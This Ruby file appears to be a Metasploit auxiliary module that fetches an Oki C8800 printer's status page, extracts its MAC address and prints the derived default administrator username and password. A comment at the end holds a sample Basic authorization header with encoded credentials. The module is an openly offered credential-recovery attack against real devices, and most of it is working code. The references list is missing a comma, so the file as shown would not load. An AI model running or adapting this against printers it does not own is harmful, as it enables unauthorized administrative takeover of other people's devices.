require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'        => 'Oki C8800 Default Credentials',
      'Description' => 'Calculate the default administrator credentials of the Oki C8800 printers',
      'Author'      => ['CosasDePuma <https://github.com/cosasdepuma>'],
      'Privileged'  => 'false',
      'License'     => MSF_LICENSE,

      'References'  => [
        [ 'URL', 'https://www.cleancss.com/router-default/Oki/C8800' ]
        [ 'URL', 'https://github.com/CosasDePuma/HackerTools/blob/master/.msf4/modules/auxiliary/ainzooal/printer/oki/c8800_default_admin_creds.rb' ]
      ]
    )

    register_options(
      [
        Opt::RPORT('80'),
        OptString.new('TARGETURI', [true, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', '/netsum.htm'])
      ], self.class)
  end


  def run
    uri = target_uri.path

    print_status("Sending GET request...")
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => uri
    })


    # Check if the request was successfull
    if res && res.code == 200
      # == >> RegExp MAC Address
      # :             Matches a ':' character
      # [0-9A-F]{2}   Matches any hex digit two times
      print_status("Calculating default credentials...")
      mac = res.get_html_document.to_s.scan(/(:[0-9A-F]{2})/)
      # Password is the last three MAC hex pairs without dots
      passwd = mac[-3..-1].join.gsub(':', '')

      if passwd.length == 6
        print_good("Default Username: root")
        print_good("Default Password: #{passwd}")
      else
        print_error("Default credentials not found!")
      end

    else
      print_error("Connection refused")
    end
  end
end

=begin
<!-- 7. Administrator Login -->
		<tr>
			<td align="center">
				<input style="font-family: Verdana, Arial, sans-serif; font-size:12px; font-weight:bold; color:black; background-color:#eeeeee; width:150px" type="button" value="Administrator Login" onclick="login();">
			</td>
		</tr>


    Authorization = "Basic cm9vdDoyQzk3OTM="
=end
